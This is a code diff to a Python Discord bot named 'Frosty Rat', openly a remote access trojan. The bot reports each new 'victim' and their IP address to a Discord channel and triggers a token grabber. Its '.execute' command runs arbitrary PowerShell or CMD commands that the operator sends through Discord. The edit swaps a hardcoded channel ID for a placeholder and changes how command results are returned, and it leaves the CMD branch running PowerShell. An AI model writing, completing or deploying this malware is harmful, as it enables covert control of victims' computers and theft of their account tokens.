@@ -97,7 +97,7 @@ except:
 @client.event
 async def on_ready() -> None:
     await client.wait_until_ready()
-    channel = client.get_channel(944294149753012277)
+    channel = client.get_channel("replace this str with channelid")
     embedVar = discord.Embed(title="Victim Added", description="Frosty Rat Started ", color=0x0000FF)
     embedVar.add_field(name="Ip Address", value="{}".format(data["ip"]), inline=False)
     await channel.send(embed=embedVar)
@@ -251,13 +251,6 @@ async def on_message(message):
         tokengrabber.main()
 
     if message.content == ".execute":
-
-        name_of_file = "Command_Output"
-        completeName = os.path.join(parent_path, name_of_file+".txt") 
-        thefile = open(completeName, "w")
-                
-
-
         await message.channel.send("PS or CMD?")#
         psorcmd = await client.wait_for("message", timeout=30)
 
@@ -265,21 +258,20 @@ async def on_message(message):
             if psorcmd.content == "PS": 
                 await message.channel.send("what command?")
                 interaction = await client.wait_for("message", timeout=30)
-                thefile.write(str(os.system(f"PowerShell /c {interaction.content}")))
-                thefile.close()
-                await message.channel.send(file= discord.File(parent_path+"\\Command_Output.txt"))
+                await message.channel.send(os.system(f"PowerShell /c {interaction.content}"))
+                await message.channel.send("0 means worked , 1 means failed")
                 #  await message.channel.send(f" Returned: {returned}")
             elif psorcmd.content == "CMD": 
                 await message.channel.send("what command?")
                 interaction = await client.wait_for("message", timeout=30)
-                thefile.write(str(os.system(f"cmd /c {interaction.content}")))
-                thefile.close()
-                await message.channel.send(file= discord.File(parent_path+"\\Command_Output.txt"))            #  await message.channel.send(f" Returned: {returned}")
+                await message.channel.send(os.system(f"PowerShell /c {interaction.content}"))
+                await message.channel.send("0 means worked , 1 means failed")
+
         except:
             await message.channel.send("``` Error Has Occured ```")
 
 
-        # os.remove(parent_path+"\\Command_Output.txt")
+
 
 
 
